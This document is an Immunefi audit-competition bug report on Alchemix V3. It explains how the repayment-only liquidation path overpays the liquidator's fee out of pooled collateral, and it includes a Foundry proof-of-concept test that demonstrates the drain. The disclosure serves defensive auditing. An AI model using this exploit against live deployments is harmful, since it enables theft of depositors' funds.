# 58101 sc critical repayment only liquidation overpays fee from pooled collateral

**Submitted on Oct 30th 2025 at 17:00:37 UTC by @Anirruth for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58101
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

When liquidation enters the “repayment-only” path (earmarks fully repay the borrower’s debt), the protocol pays the liquidator the full theoretical repayment fee even if the borrower’s collateral couldn’t fund it. The shortfall is taken from the contract’s MYT balance.

## Vulnerability Details

* Liquidation first earmarks and repays via \_forceRepay. If this fully clears debt, it executes the following if block: <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol?utm\\_source=immunefi#L823-L828>

```
// If debt is fully cleared, return with only the repaid amount, no liquidation needed, caller receives repayment fee
        if (account.debt == 0) {
            feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
            return (repaidAmountInYield, feeInYield, 0);
        }
```

* The \_resolveRepaymentFee computes the theoretical fee and deducts only what’s available from the borrower’s balance, but returns the full, unclamped fee: <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol?utm\\_source=immunefi#L900-L907>

```
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        fee = repaidAmountInYield * repaymentFee / BPS;
        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
        return fee;
    }
```

* The call site then transfers that full theoretical fee to the liquidator from the contract’s balance, regardless of what was actually deducted from the borrower.

The calculation in the \_doLiquidation function has proper checks,

```
if (feeInYield > 0 && account.collateralBalance >= feeInYield) {
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
        }
```

Consider the following scenario:

* Debt repaid: 100 MYT; repayment fee: 10% → theoretical fee = 10 MYT.
* Borrower’s remaining collateral balance: 2 MYT.
* \_resolveRepaymentFee deducts 2 from collateral balance but the function returns returns 10.
* Liquidator receives 10 where 8 is sourced from the contract pool.

## Impact Details

Direct loss of funds from the pooled collateral.

Liquidators can repeatedly extract fee shortfalls from pooled MYT across many underfunded accounts, draining the contract’s balance.

## References

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol?utm\\_source=immunefi#L823-L828>

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol?utm\\_source=immunefi#L900-L907>

## Proof of Concept

## Proof of Concept

Paste the following test in AlchemistV3.t.sol and run `forge test --match-test testRepaymentFee_Overdraw_FromPool_OnRepaymentOnlyPath`

```
function testRepaymentFee_Overdraw_FromPool_OnRepaymentOnlyPath() external {
        // 0) Configure to enter liquidation easily and set a large repayment fee
        vm.startPrank(alchemist.admin());
        alchemist.setDepositCap(type(uint256).max);
        // Make liquidation check inclusive (ratio == bound enters)
        alchemist.setCollateralizationLowerBound(alchemist.minimumCollateralization());
        // Set a high repayment fee (e.g., 30%) to exceed leftover collateral after full repay
        alchemist.setRepaymentFee(3000);
        vm.stopPrank();

        // 1) Provide pooled collateral from another user so the contract holds extra MYT
        deal(address(vault), yetAnotherExternalUser, depositAmount * 5);
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 5);
        alchemist.deposit(depositAmount * 5, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // 2) Borrower mints exactly at the min collateralization limit
        uint256 amount = 100e18;
        deal(address(vault), address(0xbeef), amount);
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount);
        alchemist.deposit(amount, address(0xbeef), 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        uint256 maxBorrow = alchemist.totalValue(tokenId) * FIXED_POINT_SCALAR / alchemist.minimumCollateralization();
        alchemist.mint(tokenId, maxBorrow, address(0xbeef));
        vm.stopPrank();

        // 3) Create a full redemption in the Transmuter to make earmark >= borrower debt
        // Ensure totalSyntheticsIssued >= amount to lock
        vm.startPrank(address(0xdad));
        uint256 debtNow; uint256 collNow; (collNow, debtNow,) = alchemist.getCDP(tokenId);
        // Cap the redemption to current synthetics issued
        uint256 redeemDebt = debtNow;
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), redeemDebt);
        transmuterLogic.createRedemption(redeemDebt);
        vm.stopPrank();

        // 4) Fast-forward blocks so queryGraph returns ~redeemDebt
        vm.roll(block.number + transmuterLogic.timeToTransmute());

        // 4b) Nudge price down slightly to guarantee undercollateralization (ratio <= lower bound)
        uint256 initSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        // +1% supply ~ 0.99x price
        uint256 newSupply = initSupply + (initSupply * 100 / 10_000);
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(newSupply);

        // 5) Snapshot pre-state
        (uint256 prevCollateral, uint256 prevDebt,) = alchemist.getCDP(tokenId);
        require(prevDebt > 0 && prevCollateral > 0, "bad pre-state");
        uint256 creditToYield = alchemist.convertDebtTokensToYield(prevDebt);
        uint256 leftoverBeforeFee = prevCollateral > creditToYield ? prevCollateral - creditToYield : 0;

        uint256 alchemistPrevBal = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 liquidatorPrevBal = IERC20(address(vault)).balanceOf(externalUser);

        // 6) Call liquidate: under-collateralization now holds due to the small price drop.
        vm.startPrank(externalUser);
        (uint256 repaidYield, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenId);
        vm.stopPrank();

        // 7) Post-state and assertions
        (uint256 postCollateral, uint256 postDebt,) = alchemist.getCDP(tokenId);
        uint256 alchemistPostBal = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 liquidatorPostBal = IERC20(address(vault)).balanceOf(externalUser);

        // Repayment-only path: no underlying fee expected
        vm.assertEq(feeInUnderlying, 0);
        // Full repayment should have occurred (given earmark == debt)
        vm.assertEq(postDebt, 0);
        // Repaid yield should match expected convert(debt)
        vm.assertApproxEqAbs(repaidYield, creditToYield, 1);
        // Liquidator received the full (theoretical) repayment fee
        vm.assertEq(liquidatorPostBal - liquidatorPrevBal, feeInYield);

        // Amount actually taken from the borrower's remaining collateral for the fee
        uint256 paidFromAccount = leftoverBeforeFee > postCollateral ? leftoverBeforeFee - postCollateral : 0;
        // Show overdraw: account couldn't fund the full fee, but liquidator still got it
        vm.assertTrue(feeInYield > paidFromAccount, "fee not overdrawn");

        // Contract's MYT outflow equals repaid (to transmuter) + full fee paid to liquidator
        vm.assertApproxEqAbs(alchemistPrevBal - alchemistPostBal, repaidYield + feeInYield, 1);
    }
```
